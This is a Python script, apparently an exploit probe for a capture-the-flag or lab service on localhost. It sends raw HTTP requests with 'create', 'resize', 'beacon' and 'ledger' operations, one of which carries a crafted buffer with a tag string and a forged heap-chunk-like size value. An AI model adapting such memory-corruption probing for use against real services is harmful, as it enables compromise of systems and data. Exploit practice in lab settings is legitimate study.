import socket, struct, sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 19999

class Http:
    def __init__(self, host, port, timeout=8):
        self.s = socket.create_connection((host, port), timeout=timeout)
        self.s.settimeout(timeout)
        self.buf = b""
    def q(self, args):
        self.s.sendall(("GET /?" + args + " HTTP/1.1\r\nHost: x\r\n\r\n").encode())
        while b"\r\n\r\n" not in self.buf:
            d = self.s.recv(65536)
            if not d: raise EOFError("closed")
            self.buf += d
        head, rest = self.buf.split(b"\r\n\r\n", 1)
        self.buf = rest
        lines = head.split(b"\r\n")
        status = int(lines[0].split()[1])
        clen=None; chunked=False
        for l in lines[1:]:
            k,_,v = l.partition(b":")
            k=k.strip().lower()
            if k==b"content-length": clen=int(v.strip())
            if k==b"transfer-encoding" and b"chunked" in v.lower(): chunked=True
        if chunked:
            body=b""
            while True:
                while b"\r\n" not in self.buf: self.buf += self.s.recv(65536)
                line,self.buf = self.buf.split(b"\r\n",1)
                n=int(line,16)
                while len(self.buf)<n+2: self.buf += self.s.recv(65536)
                body += self.buf[:n]; self.buf=self.buf[n+2:]
                if n==0: break
            return status, body
        if clen is None: return status, b""
        while len(self.buf)<clen: self.buf += self.s.recv(65536)
        body, self.buf = self.buf[:clen], self.buf[clen:]
        return status, body

def hexs(b): return b.hex()

h = Http(HOST,PORT)
print("op=x:", h.q("op=x"))
tack = bytearray(0x180)
tack[0x38:0x40] = b"CLTACKT4"
struct.pack_into("<Q", tack, 0x40, 0x491)
print("create:", h.q("op=create&data="+hexs(bytes(tack))))
print("resize:", h.q("op=resize&data="+hexs(bytes(tack))))
print("beacon:", h.q("op=beacon"))
print("ledger:", h.q("op=ledger"))
print("beacon2:", h.q("op=beacon"))
